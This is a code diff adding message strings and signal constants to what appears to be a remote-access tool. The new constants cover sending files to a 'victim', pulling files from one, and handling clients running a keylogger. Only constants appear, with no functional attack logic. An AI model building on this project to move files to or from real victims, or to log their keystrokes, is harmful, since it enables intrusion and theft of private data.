@@ -153,6 +153,29 @@ TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred su
 ENTER_TARGET_IP_GET_FILES = "[+] Enter the target (victim) IP address to receive recorded keylog files from: "
 ENTER_TARGET_PORT_GET_FILES = "[+] Enter the target (victim) port to receive recorded keylog files from: "
 
+# MENU ITEM 6 - Transfer File to Victim
+TRANSFER_FILE_SIGNAL = "TRANSFER"
+TRANSFER_FILE_PROMPT = "[+] Enter the file path of the file that you want to send to client ({}, {}): "
+TRANSFER_FILE_FOUND_MSG = "[+] FILE FOUND: The file '{}' exists!"
+TRANSFER_FILE_INIT_MSG = "[+] Now transferring file: {}..."
+FILE_NOT_FOUND_ERROR = "[+] FILE NOT FOUND ERROR: The file '{}' does not exist."
+TRANSFER_FILE_NO_CLIENT_ERROR = "[+] ERROR: Cannot transfer file - The command server is not connected to any clients!"
+FILE_TRANSFER_KEYLOG_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer file to the following client "
+                              "(IP: {}, Port: {}) as they're currently running a keylogger program!")
+TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer file to: "
+TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
+
+
+# MENU ITEM 7 - Get File from Victim
+GET_FILE_SIGNAL = "GET FILE"
+GET_FILE_SIGNAL_MSG = ("[+] GET FILE: Sending signal to client/victim to "
+                       "get a specific file...")
+GET_FILE_PROMPT = "[+] Enter the file path of the file that you want to receive from client ({}, {}): "
+GET_FILE_EXIST = "EXIST"
+FILE_END_OF_FILE_SIGNAL = b"EOF"
+GET_FILE_ERROR = "[+] RECEIVE FILE ERROR: An error has occurred during file transfer!"
+GET_FILE_NOT_EXIST_MSG = "[+] GET FILE ERROR: The following file path {} does not exist in the client ({}, {})"
+
 # MENU ITEM 9 - Watch File
 START_WATCH_FILE_MSG = "[+] [MENU ITEM 9] - Now Watching File"
 WATCH_FILE_NO_CLIENTS_ERROR = "[+] WATCH_FILE_ERROR: The command server is not connected to any clients!"
